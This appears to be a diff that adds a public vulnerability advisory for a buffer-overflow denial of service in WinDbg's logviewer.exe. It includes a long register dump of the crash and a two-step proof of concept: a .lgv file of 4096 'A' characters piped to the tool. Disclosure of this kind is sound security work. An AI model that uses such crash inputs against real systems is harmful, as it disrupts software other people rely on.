@@ -1,0 +1,230 @@
+[+] Credits: HYP3RLINX
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/MS-WINDBG-LOGVIEWER-BUFFER-OVERFLOW.txt
+
+[+] ISR: ApparitionSec
+
+
+Vendor:
+=================
+www.microsoft.com
+
+
+Product:
+====================
+WinDbg logviewer.exe
+
+LogViewer (logviewer.exe), a tool that displays the logs created, part of
+WinDbg application.
+
+
+Vulnerability Type:
+===================
+Buffer Overflow DOS
+
+
+Vulnerability Details:
+=====================
+
+Buffer overflow in WinDbg "logviewer.exe" when opening corrupted .lgv
+files. App crash then Overwrite of MMX registers etc...
+this utility belongs to Windows Kits/8.1/Debuggers/x86
+
+Read Access Violation / Memory Corruption
+Win32 API Log Viewer
+6.3.9600.17298
+Windbg x86
+logviewer.exe
+Log Viewer 3.01 for x86
+
+
+(5fb8.32fc): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for
+C:\Windows\syswow64\msvcrt.dll -
+eax=013dad30 ebx=005d0000 ecx=00000041 edx=00000000 esi=005d2000
+edi=013dcd30
+eip=754fa048 esp=0009f840 ebp=0009f848 iopl=0         nv up ei pl nz na pe
+nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b
+efl=00210206
+msvcrt!memmove+0x1ee:
+754fa048 660f6f06        movdqa  xmm0,xmmword ptr [esi]
+ds:002b:005d2000=????????????????????????????????
+
+gs 2b
+fs 53
+es 2b
+ds 2b
+edi 136cd30
+esi 7d2000
+ebx 7d0000
+edx 0
+ecx 41
+eax 136ad30
+ebp df750
+eip 754fa048
+cs 23
+efl 210206
+esp df748
+ss 2b
+dr0 0
+dr1 0
+dr2 0
+dr3 0
+dr6 0
+dr7 0
+di cd30
+si 2000
+bx 0
+dx 0
+cx 41
+ax ad30
+bp f750
+ip a048
+fl 206
+sp f748
+bl 0
+dl 0
+cl 41
+al 30
+bh 0
+dh 0
+ch 0
+ah ad
+fpcw 27f
+fpsw 4020
+fptw ffff
+fopcode 0
+fpip 76454c1e
+fpipsel 23
+fpdp 6aec2c
+fpdpsel 2b
+st0 -1.00000000000000e+000
+st1 -1.00000000000000e+000
+st2 -1.00000000000000e+000
+st3 9.60000000000000e+001
+st4 1.08506945252884e-004
+st5 -1.00000000000000e+000
+st6 0.00000000000000e+000
+st7 0.00000000000000e+000
+mm0 0:2:2:2
+mm1 0:0:2:202
+mm2 0:1:1:1
+mm3 c000:0:0:0
+mm4 e38e:3900:0:0
+mm5 0:0:0:0
+mm6 0:0:0:0
+mm7 0:0:0:0
+mxcsr 1fa0
+xmm0 1.207843e+001: 1.207843e+001: 1.207843e+001: 1.207843e+001
+xmm1 1.207843e+001: 1.207843e+001: 1.207843e+001: 1.207843e+001
+xmm2 1.207843e+001: 1.207843e+001: 1.207843e+001: 1.207843e+001
+xmm3 1.207843e+001: 1.207843e+001: 1.207843e+001: 1.207843e+001
+xmm4 1.207843e+001: 1.207843e+001: 1.207843e+001: 1.207843e+001
+xmm5 1.207843e+001: 1.207843e+001: 1.207843e+001: 1.207843e+001
+xmm6 1.207843e+001: 1.207843e+001: 1.207843e+001: 1.207843e+001
+xmm7 1.207843e+001: 1.207843e+001: 1.207843e+001: 1.207843e+001
+iopl 0
+of 0
+df 0
+if 1
+tf 0
+sf 0
+zf 0
+af 0
+pf 1
+cf 0
+vip 0
+vif 0
+xmm0l 4141:4141:4141:4141
+xmm1l 4141:4141:4141:4141
+xmm2l 4141:4141:4141:4141
+xmm3l 4141:4141:4141:4141
+xmm4l 4141:4141:4141:4141
+xmm5l 4141:4141:4141:4141
+xmm6l 4141:4141:4141:4141
+xmm7l 4141:4141:4141:4141
+xmm0h 4141:4141:4141:4141
+xmm1h 4141:4141:4141:4141
+xmm2h 4141:4141:4141:4141
+xmm3h 4141:4141:4141:4141
+xmm4h 4141:4141:4141:4141
+xmm5h 4141:4141:4141:4141
+xmm6h 4141:4141:4141:4141
+xmm7h 4141:4141:4141:4141
+xmm0/0 41414141
+xmm0/1 41414141
+xmm0/2 41414141
+xmm0/3 41414141
+xmm1/0 41414141
+xmm1/1 41414141
+xmm1/2 41414141
+xmm1/3 41414141
+xmm2/0 41414141
+xmm2/1 41414141
+xmm2/2 41414141
+xmm2/3 41414141
+xmm3/0 41414141
+xmm3/1 41414141
+xmm3/2 41414141
+xmm3/3 41414141
+xmm4/0 41414141
+xmm4/1 41414141
+xmm4/2 41414141
+xmm4/3 41414141
+xmm5/0 41414141
+xmm5/1 41414141
+xmm5/2 41414141
+xmm5/3 41414141
+xmm6/0 41414141
+xmm6/1 41414141
+xmm6/2 41414141
+xmm6/3 41414141
+xmm7/0 41414141
+xmm7/1 41414141
+xmm7/2 41414141
+xmm7/3 41414141
+
+
+Exploit code(s):
+===============
+
+1) create  .lgv file with bunch of 'A's length of 4096 overwrites XXM
+registers, ECX etc
+2) run from command line pipe the file to it to watch it crash and burn.
+
+///////////////////////////////////////////////////////////////////////
+
+
+Disclosure Timeline:
+===============================
+Vendor Notification: June 23, 2016
+Vendor acknowledged: July 1, 2016
+Vendor reply: Will not fix (stability issue)
+July 8, 2016 : Public Disclosure
+
+
+Severity Level:
+================
+Low
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author
+prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+HYP3RLINX
